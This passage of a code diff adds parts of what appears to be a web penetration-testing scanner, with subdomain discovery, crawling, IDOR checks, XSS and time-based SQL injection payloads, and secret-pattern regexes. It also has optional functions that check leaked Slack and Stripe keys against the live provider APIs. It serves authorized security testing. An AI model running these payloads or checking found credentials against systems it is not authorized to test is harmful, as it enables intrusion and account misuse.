+    subfinder_results = _subfinder(target_host)
+    if subfinder_results is not None:
+        candidates |= subfinder_results
+    else:
+        candidates |= _cert_transparency_lookup(target_host)
+        candidates |= _dns_brute_force(target_host, wordlist)
+    log_ghost_hunter.info(f"{len(candidates)} raw candidate host(s) before scope filtering")
+    if scope_include or scope_exclude:
+        candidates = {h for h in candidates if in_scope(h, scope_include, scope_exclude)}
+        log_ghost_hunter.info(f"{len(candidates)} candidate(s) remain after scope filtering")
+    alive = _confirm_alive(candidates)
+    log_ghost_hunter.info(f"{len(alive)} confirmed alive out of {len(candidates)} candidates")
+    return alive
+
+
+# ==============================================================================
+# CRAWLER
+# ==============================================================================
+
+log_crawler = get_logger("crawler")
+
+def _run_url_tool(cmd: list[str], timeout: int = 120) -> list[str] | None:
+    return _run_tool_nonblocking(cmd, timeout)
+
+def _hostname_in_domain(hostname: str | None, domain: str) -> bool:
+    """Strict hostname boundary check; domain may include scheme and/or port."""
+    host = (hostname or "").rstrip(".").lower()
+    parsed = urlparse(domain if "://" in domain else "https://" + domain)
+    root = (parsed.hostname or "").rstrip(".").lower()
+    return bool(host) and (host == root or host.endswith("." + root))
+
+
+def _url_in_domain(url: str, domain: str) -> bool:
+    try:
+        return _hostname_in_domain(urlparse(url).hostname, domain)
+    except Exception:
+        return False
+
+def _extract_script_srcs(html: str) -> list[str]:
+    """Extract external script URLs from HTML."""
+    if not html:
+        return []
+    return re.findall(
+        r"""<script\b[^>]*\bsrc\s*=\s*["'](.*?)["']""",
+        html,
+        flags=re.I | re.S,
+    )
+
+
+def _extract_href_urls(html: str) -> list[str]:
+    """Extract href URLs from HTML."""
+    if not html:
+        return []
+    return re.findall(
+        r"""href\s*=\s*["'](.*?)["']""",
+        html,
+        flags=re.I | re.S,
+    )
+
+
+def _normalize_discovered_url(base_url: str, raw_url: str) -> str | None:
+    """Resolve and normalize a discovered HTTP(S) URL."""
+    if not isinstance(raw_url, str):
+        return None
+
+    raw_url = raw_url.strip()
+    if not raw_url:
+        return None
+
+    if raw_url.startswith((
+        "#", "javascript:", "mailto:", "tel:", "data:", "blob:"
+    )):
+        return None
+
+    full = urljoin(base_url, raw_url)
+    parsed = urlparse(full)
+
+    if parsed.scheme not in {"http", "https"}:
+        return None
+    if not parsed.hostname:
+        return None
+
+    return urlunparse((
+        parsed.scheme.lower(),
+        parsed.netloc,
+        parsed.path or "/",
+        parsed.params,
+        parsed.query,
+        "",
+    ))
+
+
+def _shallow_crawl(domain: str, max_pages: int = 20) -> list[str]:
+    """
+    Crawl up to max HTML pages while collecting in-scope assets.
+
+    JS files are collected from <script src=...> but are not counted
+    against the HTML-page budget.
+    """
+    seen_pages: set[str] = set()
+    queued_pages: set[str] = set()
+    seed = domain if "://" in domain else f"https://{domain}"
+    seed = seed.rstrip("/")
+    page_queue: list[str] = [seed]
+    queued_pages.add(seed)
+
+    discovered: set[str] = set()
+
+    while page_queue and len(seen_pages) < max_pages:
+        url = page_queue.pop(0)
+        if url in seen_pages:
+            continue
+
+        seen_pages.add(url)
+
+        # Keep the URL that was actually discovered.  Do this BEFORE
+        # following redirects so a parameterized redirect endpoint is not
+        # silently replaced by its destination and lost to later scanners.
+        requested_parsed = urlparse(url)
+        if not _hostname_in_scope(requested_parsed.hostname or "", domain):
+            continue
+        discovered.add(url)
+
+        resp = get_following_redirects(url)
+        if not resp:
+            # The endpoint is still a discovered URL; only the request failed.
+            log_crawler.warning(f"Live crawl request failed: {url}")
+            continue
+
+        final_url = _normalize_discovered_url(url, str(getattr(resp, "url", url)))
+        if not final_url:
+            final_url = url
+        final_parsed = urlparse(final_url)
+
+        # Only retain the final resource if it remains inside authorized scope.
+        if not _hostname_in_scope(final_parsed.hostname or "", domain):
+            log_crawler.warning(
+                f"Crawler redirect left authorized host: {url} -> {final_url}"
+            )
+            continue
+
+        discovered.add(final_url)
+
+        hrefs = _extract_href_urls(resp.text)
+        scripts = _extract_script_srcs(resp.text)
+
+        # JS assets: collect them, but do not enqueue as HTML pages.
+        for raw in scripts:
+            full = _normalize_discovered_url(final_url, raw)
+            if not full:
+                continue
+            parsed = urlparse(full)
+            if _hostname_in_scope(parsed.hostname or "", domain):
+                discovered.add(full)
+
+        # HTML navigation: enqueue only in-scope non-JS URLs.
+        for raw in hrefs:
+            full = _normalize_discovered_url(final_url, raw)
+            if not full:
+                continue
+
+            parsed = urlparse(full)
+            if not _hostname_in_scope(parsed.hostname or "", domain):
+                continue
+
+            if parsed.path.lower().endswith(".js"):
+                discovered.add(full)
+                continue
+
+            if full not in seen_pages and full not in queued_pages:
+                page_queue.append(full)
+                queued_pages.add(full)
+
+    return sorted(discovered)
+
+
+def discover_urls(domain: str) -> list[str]:
+    parsed = urlparse(domain if "://" in domain else f"https://{domain}")
+    tool_domain = parsed.netloc or parsed.path
+    urls = _run_url_tool(["gau", "--subs", tool_domain])
+    if urls is None:
+        urls = _run_url_tool(["waybackurls", tool_domain])
+
+    if urls is not None and urls:
+        urls = [u for u in set(urls) if _url_in_domain(u, domain)]
+        log_crawler.info(
+            f"Discovered {len(urls)} in-scope historical URL(s) via external tool"
+        )
+        return urls[:1000]
+
+    log_crawler.info(
+        "No gau/waybackurls available — falling back to shallow live crawl"
+    )
+    crawled = _shallow_crawl(domain)
+    log_crawler.info(
+        f"Shallow crawl found {len(crawled)} page/asset URL(s)"
+    )
+    return crawled
+
+
+def urls_with_params(urls: list[str]) -> list[str]:
+    return [u for u in urls if "=" in urlparse(u).query]
+
+
+def find_js_urls(urls: list[str]) -> list[str]:
+    """Return unique external JavaScript asset URLs."""
+    return sorted({
+        u for u in urls
+        if urlparse(u).path.lower().endswith(".js")
+    })
+
+_PLACEHOLDER_MARKERS = (
+    "example", "your_", "xxxx", "placeholder",
+    "changeme", "dummy", "test_key", "replace_me",
+)
+
+def _looks_like_placeholder(snippet: str) -> bool:
+    low = snippet.lower()
+    return any(marker in low for marker in _PLACEHOLDER_MARKERS)
+
+def _verify_slack_token(token: str) -> bool | None:
+    try:
+        r = httpx.post("https://slack.com/api/auth.test",
+                        headers={"Authorization": f"Bearer {token}"}, timeout=HTTP_TIMEOUT)
+        data = r.json()
+        return bool(data.get("ok"))
+    except Exception as e:
+        log_js_secrets.debug(f"Slack token verification failed: {e}")
+        return None
+
+def _verify_stripe_key(key: str) -> bool | None:
+    try:
+        r = httpx.get("https://api.stripe.com/v1/account",
+                       headers={"Authorization": f"Bearer {key}"}, timeout=HTTP_TIMEOUT)
+        return r.status_code == 200
+    except Exception as e:
+        log_js_secrets.debug(f"Stripe key verification failed: {e}")
+        return None
+
+def _verify_jwt_not_expired(token: str) -> bool | None:
+    import base64
+    try:
+        parts = token.split(".")
+        if len(parts) != 3:
+            return None
+        payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
+        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
+        exp = payload.get("exp")
+        if exp is None:
+            return None
+        return time.time() < exp
+    except Exception:
+        return None
+
+_VERIFIERS = {
+    "Slack Token": _verify_slack_token,
+    "Stripe Live Key": _verify_stripe_key,
+}
+
+# Patterns used by the JS secret scanner.
+# Detection is local by default; provider verification remains opt-in.
+SECRET_PATTERNS = {
+    "AWS Access Key": r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b",
+    "GitHub Token": r"\bgh[pousr]_[A-Za-z0-9_]{20,}\b",
+    "Slack Token": r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b",
+    "Stripe Live Key": r"\bsk_live_[A-Za-z0-9]{16,}\b",
+    "Google API Key": r"\bAIza[0-9A-Za-z_-]{30,}\b",
+    "JWT": r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b",
+    "Private Key Block": r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----",
+}
+
+def scan_js_for_secrets(js_urls: list[str], max_files: int = 30, verify_secrets: bool = False) -> list[dict]:
+    findings = []
+    for url in js_urls[:max_files]:
+        resp = get_following_redirects(url)
+        if not resp or resp.status_code != 200:
+            continue
+        body = resp.text
+        for label, pattern in SECRET_PATTERNS.items():
+            for match in re.finditer(pattern, body):
+                snippet = match.group(0)
+                if _looks_like_placeholder(snippet):
+                    continue
+                masked = (snippet[:6] + "..." + snippet[-4:]) if len(snippet) > 14 else "***"
+                confidence = "SUSPECTED — pattern match only, live status unknown"
+                proof = f"Pattern match for {label} in loaded JS bundle (masked: {masked})."
+                verifier = _VERIFIERS.get(label) if verify_secrets else None
+                if verifier:
+                    is_live = verifier(snippet)
+                    if is_live is True:
+                        confidence = "CONFIRMED — credential verified live"
+                        proof = f"Pattern match for {label} (masked: {masked}) AND confirmed live."
+                    elif is_live is False:
+                        confidence = "INFORMATIONAL — pattern matched but credential is confirmed dead/revoked"
+                        proof = f"Pattern match for {label} (masked: {masked}), but provider rejected it."
+                elif label == "JWT":
+                    not_expired = _verify_jwt_not_expired(snippet)
+                    if not_expired is True:
+                        confidence = "SUSPECTED — token structurally valid and not expired"
+                        proof = f"JWT found (masked: {masked}) with a future 'exp' claim."
+                    elif not_expired is False:
+                        confidence = "INFORMATIONAL — JWT found but expired"
+                        proof = f"JWT found (masked: {masked}) but expired."
+                findings.append({
+                    "type": f"Exposed Secret — {label}",
+                    "confidence": confidence,
+                    "url": url,
+                    "proof": proof,
+                    "repro": f"curl -s '{url}' | grep -oE '{pattern}'",
+                    "img": None,
+                })
+                log_js_secrets.info(f"{label} found in {url} — {confidence.split(' — ')[0]}")
+    return findings
+
+
+# ==============================================================================
+# SCREENSHOT EVIDENCE
+# ==============================================================================
+
+log_screenshot = get_logger("screenshot")
+
+def _new_browser_context(browser, base_url: str | None = None):
+    """Create a Playwright context carrying the optional auth session."""
+    context = browser.new_context(extra_http_headers=_AUTH_HEADERS or {})
+    if _AUTH_COOKIES:
+        parsed = urlparse(base_url or "https://localhost")
+        domain = parsed.hostname or AUTH_COOKIE_DOMAIN
+        if domain:
+            context.add_cookies([
+                {
+                    "name": name,
+                    "value": value,
+                    "domain": domain,
+                    "path": "/",
+                }
+                for name, value in _AUTH_COOKIES.items()
+            ])
+    return context
+
+
+def capture_screenshot(url: str) -> str | None:
+    fname = str(EVIDENCE_DIR / f"PoC_{re.sub(r'[^a-z0-9]', '_', url.lower())[:60]}.png")
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True)
+            context = _new_browser_context(browser, url)
+            page = context.new_page()
+            page.goto(url, timeout=10000, wait_until="networkidle")
+            page.screenshot(path=fname)
+            context.close()
+            browser.close()
+        return fname
+    except Exception as e:
+        log_screenshot.warning(f"Screenshot failed for {url}: {e}")
+        return None
+
+
+# ==============================================================================
+# THE BRAIN
+# ==============================================================================
+
+log_brain = get_logger("brain")
+
+_BUILTIN_DOCTRINE = {
+    "IDOR / Unauthorized Access": {
+        "sev": "CRITICAL", "score": 9.1,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "owasp": "A01:2021-Broken Access Control",
+        "fix": "Enforce object-level authorization checks.",
+        "attacker_pov": "An attacker with a valid low-privilege account enumerates or guesses adjacent resource IDs.",
+    },
+    "Sensitive Data Exposure": {
+        "sev": "HIGH", "score": 7.5,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "owasp": "A05:2021-Security Misconfiguration",
+        "fix": "Disable directory listing and restrict access to sensitive files.",
+        "attacker_pov": "An attacker requests known sensitive file paths directly.",
+    },
+    "Reflected XSS": {
+        "sev": "MEDIUM", "score": 6.1,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "owasp": "A03:2021-Injection",
+        "fix": "Context-appropriately encode all user input before reflecting it.",
+        "attacker_pov": "An attacker crafts a malicious link containing the payload.",
+    },
+    "Reflected XSS (DOM-based)": {
+        "sev": "MEDIUM", "score": 6.1,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "owasp": "A03:2021-Injection",
+        "fix": "Avoid using client-side sources in sinks without proper sanitization.",
+        "attacker_pov": "An attacker crafts a URL with a malicious fragment identifier.",
+    },
+    "SQL Injection (error-based)": {
+        "sev": "CRITICAL", "score": 9.8,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "owasp": "A03:2021-Injection",
+        "fix": "Use parameterized queries / prepared statements exclusively.",
+        "attacker_pov": "An attacker uses database error output to fingerprint the DB.",
+    },
+    "SQL Injection (time-based blind)": {
+        "sev": "CRITICAL", "score": 9.8,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "owasp": "A03:2021-Injection",
+        "fix": "Use parameterized queries / prepared statements exclusively.",
+        "attacker_pov": "An attacker uses deliberate time delays to extract data.",
+    },
+    "SQL Injection (boolean-based, blind)": {
+        "sev": "CRITICAL", "score": 9.1,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "owasp": "A03:2021-Injection",
+        "fix": "Use parameterized queries / prepared statements exclusively.",
+        "attacker_pov": "An attacker sends true/false conditional queries.",
+    },
+    "Open Redirect": {
+        "sev": "MEDIUM", "score": 4.7,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+        "owasp": "A01:2021-Broken Access Control",
+        "fix": "Validate redirect targets against an explicit allowlist.",
+        "attacker_pov": "An attacker sends a victim a link to the trusted domain that silently redirects.",
+    },
+    "Command Injection (time-based blind)": {
+        "sev": "CRITICAL", "score": 9.8,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "owasp": "A03:2021-Injection",
+        "fix": "Never pass user-supplied input directly into OS command execution functions.",
+        "attacker_pov": "An attacker injects OS command separators into an unsanitized input field.",
+    },
+    "Local File Inclusion": {
+        "sev": "HIGH", "score": 7.5,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "owasp": "A05:2021-Security Misconfiguration",
+        "fix": "Disable allow_url_include in PHP. Whitelist acceptable file paths.",
+        "attacker_pov": "An attacker manipulates a file path parameter to read arbitrary files.",
+    },
+    "Auth Bypass": {
+        "sev": "CRITICAL", "score": 9.1,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "owasp": "A01:2021-Broken Access Control",
+        "fix": "Implement server-side authorization checks on every request.",
+        "attacker_pov": "An attacker uses SQL injection, JWT manipulation, or default credentials.",
+    },
+    "Weak Credentials / Default Login": {
+        "sev": "HIGH", "score": 8.2,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L",
+        "owasp": "A07:2021-Identification and Authentication Failures",
+        "fix": "Enforce password complexity requirements. Disable default accounts.",
+        "attacker_pov": "An attacker systematically tries common usernames and passwords.",
+    },
+    "SQL Injection — Data Exfiltrated": {
+        "sev": "CRITICAL", "score": 10.0,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "owasp": "A03:2021-Injection",
+        "fix": "Same as SQL Injection remediation above.",
+        "attacker_pov": "An attacker has already extracted database contents.",
+    },
+    "XSS — Session Cookie Captured": {
+        "sev": "CRITICAL", "score": 8.3,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+        "owasp": "A03:2021-Injection",
+        "fix": "Same as XSS remediation.",
+        "attacker_pov": "An attacker exploited the XSS vulnerability to steal a user's session cookie.",
+    },
+    "Remote File Inclusion": {
+        "sev": "CRITICAL", "score": 9.8,
+        "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "owasp": "A03:2021-Injection",
+        "fix": "Disable allow_url_include. Use an allowlist of permitted file paths.",
+        "attacker_pov": "An attacker can include arbitrary remote files.",
+    },
+}
+
+def load_signatures() -> dict:
+    doctrine = dict(_BUILTIN_DOCTRINE)
+    if VULN_DB_PATH.exists():
+        try:
+            with open(VULN_DB_PATH) as f:
+                custom = json.load(f)
+            doctrine.update(custom)
+            log_brain.info(f"Loaded {len(custom)} custom signature(s) from vuln_db.json")
+        except Exception as e:
+            log_brain.warning(f"Failed to parse vuln_db.json: {e}")
+    else:
+        log_brain.info("No vuln_db.json found — using built-in doctrine only")
+    return doctrine
+
+def get_vuln_details(bug_type: str, doctrine: dict = None) -> dict:
+    doctrine = doctrine or _BUILTIN_DOCTRINE
+    if bug_type in doctrine:
+        return doctrine[bug_type]
+    if bug_type.startswith("Exposed Secret"):
+        return {
+            "sev": "HIGH", "score": 8.6,
+            "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+            "owasp": "A05:2021-Security Misconfiguration",
+            "fix": "Remove the credential from client-side code immediately, rotate it, and move secret handling to a server-side proxy.",
+            "attacker_pov": "An attacker extracts the credential directly from publicly loaded JS.",
+        }
+    if bug_type.startswith("Endpoint Found"):
+        return {
+            "sev": "LOW", "score": 3.7,
+            "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            "owasp": "A05:2021-Security Misconfiguration",
+            "fix": "Review each discovered endpoint for access controls.",
+            "attacker_pov": "An attacker expands their knowledge of the attack surface.",
+        }
+    if bug_type.startswith("Exploit Payloads Generated"):
+        return {
+            "sev": "NONE", "score": 0.0,
+            "vec": "N/A",
+            "owasp": "General",
+            "fix": "Address the underlying vulnerabilities.",
+            "attacker_pov": "Operational artifacts from offensive engagement.",
+        }
+    return {
+        "sev": "LOW", "score": 2.0, "vec": "N/A", "owasp": "General",
+        "fix": "Apply standard security patching and review manually.",
+        "attacker_pov": "Not yet characterized.",
+    }
+
+def brain_context_for_prompt(doctrine: dict) -> str:
+    custom_only = {k: v for k, v in doctrine.items() if k not in _BUILTIN_DOCTRINE}
+    if not custom_only:
+        return "No custom signatures loaded. Rely on standard CVE/OWASP knowledge only."
+    return json.dumps(custom_only)
+
+
+# ==============================================================================
+# SCANNER: IDOR (fixed false positives)
+# ==============================================================================
+
+log_idor = get_logger("idor")
+
+def _signature(resp):
+    body_hash = hashlib.sha256(resp.content).hexdigest()[:16]
+    return (resp.status_code, len(resp.content), body_hash)
+
+def confirmed_idor_check(base_url, endpoint_template, resource_id, session_a, session_b):
+    url = f"{base_url}{endpoint_template.format(id=resource_id)}"
+    as_owner = get(url, headers=session_b)
+    as_other = get(url, headers=session_a)
+    if not as_owner or not as_other:
+        return None
+
+    def _is_generic_page(resp):
+        generic_indicators = [
+            "login", "sign in", "please log in", "authentication required",
+            "access denied", "403 forbidden", "401 unauthorized",
+            "session expired", "invalid session", "redirecting to login",
+            "<!-- generic", "login page", "signin"
+        ]
+        text = resp.text.lower()
+        matches = sum(1 for ind in generic_indicators if ind in text)
+        return matches >= 3
+
+    def _contains_user_data(resp, user_id):
+        """Only accept identifiers tied to Account B/resource, never a generic email."""
+        text = resp.text
+        literal_patterns = [
+            f'"{user_id}"', f"id={user_id}", f"user_{user_id}",
+            f"profile/{user_id}", f"User ID: {user_id}",
+            f"resource_id={user_id}", f'"resource_id": "{user_id}"',
+            f'"resource_id": {user_id}',
+        ]
+        return any(p.lower() in text.lower() for p in literal_patterns)
+
+    def _normalize_dynamic(text):
+        text = re.sub(r'csrf_token=[a-f0-9]{32}', '[TOKEN]', text)
+        text = re.sub(r'_csrf=[a-f0-9]{32}', '[TOKEN]', text)
+        text = re.sub(r'sess=[a-f0-9]{32}', '[SESSION]', text)
+        text = re.sub(r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}', '[TIMESTAMP]', text)
+        return text
+
+    if _is_generic_page(as_other):
+        return None
+
+    if _contains_user_data(as_other, resource_id):
+        return {
+            "type": "IDOR / Unauthorized Access",
+            "confidence": "CONFIRMED",
+            "url": url,
+            "proof": f"Account A retrieved Account B's data. Status {as_other.status_code}, contains user-specific data.",
+            "repro": f"curl -i '{url}' -H 'Authorization: <ACCOUNT_A_TOKEN>'",
+            "img": capture_screenshot(url),
+        }
+
+    owner_sig = _signature(as_owner)
+    other_sig = _signature(as_other)
+    if (as_other.status_code < 300 and other_sig[1:] == owner_sig[1:] and
+        _normalize_dynamic(as_owner.text) == _normalize_dynamic(as_other.text)):
+        return {
+            "type": "IDOR / Unauthorized Access",
+            "confidence": "SUSPECTED — manual verification required",
+            "url": url,
+            "proof": "Responses are identical after removing dynamic tokens; could be generic error page.",
+            "repro": f"curl -i '{url}' -H 'Authorization: <ACCOUNT_A_TOKEN>'",
+            "img": capture_screenshot(url),
+        }
+    return None
+
+def suspected_idor_scan(base_url, endpoint_template, candidate_ids, baseline_id="0000000000"):
+    findings = []
+    baseline_url = f"{base_url}{endpoint_template.format(id=baseline_id)}"
+    baseline_resp = get(baseline_url)
+    if not baseline_resp:
+        log_idor.warning(f"Could not establish baseline for {base_url} — skipping")
+        return findings
+
+    baseline_sig = _signature(baseline_resp)
+
+    def _is_dynamic_error_page(resp):
+        error_indicators = [
+            "404", "not found", "does not exist", "no such",
+            "invalid id", "not available", "sorry",
+            "error", "not exist", "could not find",
+            "no record", "not found in database"
+        ]
+        text = resp.text.lower()
+        matches = sum(1 for ind in error_indicators if ind in text)
+        return matches >= 2
+
+    def _has_reflected_id(resp, cid):
+        patterns = [
+            f"id: {cid}", f"id={cid}", f'"{cid}"',
+            f"ID {cid}", f"#{cid}", f"{cid} not found"
+        ]
+        return any(p in resp.text for p in patterns)
+
+    for cid in candidate_ids:
+        url = f"{base_url}{endpoint_template.format(id=cid)}"
+        resp = get(url)
+        if not resp:
+            continue
+        if _is_dynamic_error_page(resp) or _has_reflected_id(resp, cid):
+            continue
+        sig = _signature(resp)
+        if sig != baseline_sig and resp.status_code < 300 and len(resp.text) > 100:
+            findings.append({
+                "type": "IDOR / Unauthorized Access",
+                "confidence": "SUSPECTED — requires manual verification",
+                "url": url,
+                "proof": f"Response differs from baseline ({len(resp.text)} vs {baseline_sig[1]}b). Not a clear error page.",
+                "repro": f"curl -i '{url}'",
+                "img": capture_screenshot(url),
+            })
+    return findings
+
+
+# ==============================================================================
+# SCANNER: XSS (multi-context + DOM detection) — FIXED variable mismatches
+# ==============================================================================
+
+log_xss = get_logger("xss")
+CANARY = "buraqXSS9f3a"
+
+def _inject(url, param, payload):
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    if param not in qs:
+        return None
+    qs[param] = [payload]
+    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+
+def _confirm_execution_in_browser(url: str) -> bool:
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True)
+            context = _new_browser_context(browser, url)
+            page = context.new_page()
+            page.goto(url, timeout=10000, wait_until="networkidle")
+            result = page.evaluate("() => window.__buraq_confirmed__ || null")
+            browser.close()
+            return result == CANARY
+    except Exception as e:
+        log_xss.debug(f"Browser execution check failed for {url}: {e}")
+        return False
+
+def _check_dom_xss(url: str, payload: str) -> bool:
+    """Check if the payload ends up in the DOM after navigation."""
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True)
+            context = _new_browser_context(browser, url)
+            page = context.new_page()
+            # Inject script before navigation so it survives page load
+            page.add_init_script("""
+                window.__xss_found__ = false;
+                const observer = new MutationObserver(() => {
+                    if (document.body && document.body.innerHTML.includes("buraqXSS9f3a")) {
+                        window.__xss_found__ = true;
+                    }
+                });
+                observer.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
+                // Also check after DOMContentLoaded
+                document.addEventListener('DOMContentLoaded', () => {
+                    if (document.body && document.body.innerHTML.includes("buraqXSS9f3a")) {
+                        window.__xss_found__ = true;
+                    }
+                });
+            """)
+            page.goto(url, timeout=10000, wait_until="networkidle")
+            time.sleep(1)  # allow any async mutations
+            result = page.evaluate("() => window.__xss_found__ || false")
+            browser.close()
+            return bool(result)
+    except Exception as e:
+        log_xss.debug(f"DOM XSS check failed: {e}")
+        return False
+
+def scan_reflected_xss(url: str) -> list[dict]:
+    findings = []
+    parsed = urlparse(url)
+    # Use consistent variable and inject the CANARY value
+    PAYLOADS = [
+        (f'"><script>window.__buraq_confirmed__="{CANARY}"</script>', 'html_attribute'),
+        (f'<script>window.__buraq_confirmed__="{CANARY}"</script>', 'html'),
+        (f'";window.__buraq_confirmed__="{CANARY}";//', 'js_string'),
+        (f';window.__buraq_confirmed__="{CANARY}";//', 'js'),
+        (f'${{window.__buraq_confirmed__="{CANARY}"}}', 'template_literal'),
+        (f'#<script>window.__buraq_confirmed__="{CANARY}"</script>', 'url_hash'),
+        (f'";window.__buraq_confirmed__="{CANARY}";"', 'json_string'),
+    ]
+    for param in parse_qs(parsed.query):
+        for payload, context in PAYLOADS:
+            test_url = _inject(url, param, payload)
+            if not test_url:
+                continue
+            resp = get(test_url)
+            if not resp or CANARY not in resp.text:
+                continue
+            executed = _confirm_execution_in_browser(test_url)
+            if executed:
+                findings.append({
+                    "type": "Reflected XSS",
+                    "confidence": f"CONFIRMED — execution in {context} context",
+                    "url": test_url,
+                    "proof": f"Payload executed; window.__buraq_confirmed__ == '{CANARY}'",
+                    "repro": f"Open in browser: {test_url}",
+                    "img": capture_screenshot(test_url),
+                })
+                break
+            else:
+                if _check_dom_xss(test_url, payload):
+                    findings.append({
+                        "type": "Reflected XSS (DOM-based)",
+                        "confidence": "SUSPECTED — DOM injection detected",
+                        "url": test_url,
+                        "proof": "Payload appears in DOM but not in raw HTTP response (likely DOM-based).",
+                        "repro": f"Open developer console: {test_url}",
+                        "img": None,
+                    })
+    return findings
+
+
+# ==============================================================================
+# SCANNER: SQLI (fixed injection function — no double‑quoting)
+# ==============================================================================
+
+log_sqli = get_logger("sqli")
+
+ERROR_SIGNATURES = [
+    "sql syntax", "mysql_fetch", "unclosed quotation", "sqlstate",
+    "odbc drivers", "pg_query", "sqlite3.operationalerror", "ora-00933",
+    "warning: mysql", "unterminated string", "quoted string not properly terminated",
+]
+
+TIME_PAYLOADS = {
+    "MySQL":      f"' AND SLEEP({SLEEP_SECONDS})-- -",
+    "PostgreSQL": f"' AND pg_sleep({SLEEP_SECONDS})-- -",
+    "MSSQL":      f"'; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
+}
+
+_time_executor = concurrent.futures.ThreadPoolExecutor(max_workers=TIME_BASED_THREADS)
+
+def _inject_sqli(url, param, value):
+    """Inject the given value into the parameter. Caller must supply the full injection string."""
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    if param not in qs:
+        return None
+    qs[param] = [value]
+    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+
+def _timed_request(url: str) -> float | None:
+    t0 = time.monotonic()
+    resp = get(url)
+    elapsed = time.monotonic() - t0
+    return elapsed if resp is not None else None
+
+def _timed_request_with_pool(url: str) -> float | None:
+    future = _time_executor.submit(_timed_request, url)
+    try:
+        return future.result(timeout=HTTP_TIMEOUT + 5)
+    except concurrent.futures.TimeoutError:
+        log_sqli.warning(f"Time-based request timed out: {url}")
+        return None
+
+def _median(values):
+    vals = sorted(values)
+    n = len(vals)
+    if not n:
+        return None
+    mid = n // 2
+    return vals[mid] if n % 2 else (vals[mid - 1] + vals[mid]) / 2
+
+def _mad(values, center=None):
+    center = _median(values) if center is None else center
+    return _median([abs(v - center) for v in values]) if values else None
+
+def _timing_evidence(control_times: list[float], test_times: list[float]) -> tuple[bool, float, float, float]:
+    """Require repeated, low-variance separation instead of one average threshold."""
+    control_med = _median(control_times)
+    test_med = _median(test_times)
+    control_mad = _mad(control_times, control_med) or 0.0
+    test_mad = _mad(test_times, test_med) or 0.0
+    delta = test_med - control_med
+    robust_noise = max(control_mad, test_mad)
+    # Require both an absolute delay and separation greater than observed jitter.
+    confirmed = (delta >= TIME_MIN_SEPARATION
+                 and abs(delta - SLEEP_SECONDS) <= TIME_TOLERANCE
+                 and delta > max(2.0 * robust_noise, 1.0))
+    return confirmed, delta, control_med, test_med
+
+def _confirm_time_based_sqli(url: str, param: str, original_value: str) -> dict | None:
+    control_payload = "' AND '1'='1"
+    control_url = _inject_sqli(url, param, original_value + control_payload)
+    control_times = []
+    for _ in range(TIME_TRIALS):
+        elapsed = _timed_request_with_pool(control_url)
+        if elapsed is not None:
+            control_times.append(elapsed)
+    if len(control_times) < TIME_TRIALS:
+        return None
+    for engine, payload in TIME_PAYLOADS.items():
+        test_url = _inject_sqli(url, param, original_value + payload)
+        test_times = []
+        for _ in range(TIME_TRIALS):
+            elapsed = _timed_request_with_pool(test_url)
+            if elapsed is not None:
+                test_times.append(elapsed)
+        if len(test_times) < TIME_TRIALS:
+            continue
+        ok, delta, control_med, test_med = _timing_evidence(control_times, test_times)
+        if ok:
+            return {
+                "type": "SQL Injection (time-based blind)",
+                "status": "CONFIRMED",
+                "confidence": f"CONFIRMED — {engine} time-delay verified across {TIME_TRIALS} trials",
+                "url": test_url,
+                "proof": (f"Median control={control_med:.2f}s, median test={test_med:.2f}s, "
+                          f"robust delta={delta:.2f}s with low observed jitter."),
+                "repro": f"curl -s '{test_url}'  # expect ~{SLEEP_SECONDS}s delay",
+                "img": None,
+            }
+    return None
+
+def scan_sqli(url: str) -> list[dict]:
+    findings = []
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    for param, values in qs.items():
+        original = values[0]
+        # Error-based: caller appends the single quote
+        error_url = _inject_sqli(url, param, original + "'")
+        if error_url:
+            err_resp = get(error_url)
